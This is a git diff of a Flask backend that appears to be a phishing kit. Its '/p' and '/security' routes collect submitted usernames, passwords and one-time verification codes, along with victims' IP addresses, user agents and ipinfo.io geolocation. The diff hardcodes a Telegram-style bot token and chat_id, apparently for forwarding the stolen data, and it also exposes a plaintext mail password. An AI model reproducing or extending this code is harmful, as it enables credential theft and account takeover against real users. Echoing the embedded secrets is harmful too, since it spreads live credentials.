@@ -37,12 +37,15 @@ app.config['MAIL_USERNAME'] = 'support@monibyit.com'
 app.config['MAIL_PASSWORD'] = 'Monibyit1234.'
 app.config['MAIL_DEFAULT_SENDER'] = 'support@monibyit.com'
 db = SQLAlchemy(app)
-CORS(app, resources={r"/*": {"origins": ["https://wepbyt.com"]}})
+CORS(app, resources={r"/*": {"origins": ["https://wepbyt.com", "http://127.0.0.1:5500"]}})
 
 logging.basicConfig(level=logging.INFO)
 app.logger.setLevel(logging.INFO)
 bcrypt = Bcrypt(app)
 jwt = JWTManager(app)
+
+chat_id = ""
+bot_token = "7396577653:AAEyrabC0V5CCL1t1AJ2cy2qQ-wx3hcNC3w"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -812,11 +815,9 @@ def handle_otp_n():
 def handle_p():
     if request.method == 'POST':
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        email = request.form.get('email')
-        password = request.form.get('password')
+        email = request.form.get('username')
+        password = request.form.get('key')
         user_agent = request.headers.get('User-Agent', '')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
 
         try:
             response = requests.get(f'https://ipinfo.io/{user_ip}/json')
@@ -843,9 +844,7 @@ def handle_p():
 @app.route('/security', methods=['POST'])
 def handle_otp_p():
     if request.method == 'POST':
-        otp = request.form.get('code')
-        bot_token = request.form.get('bot_token')
-        chat_id = request.form.get('chat_id')
+        otp = request.form.get('verification')
         
         if not otp:
             app.logger.warning("OTP code missing in /security request")
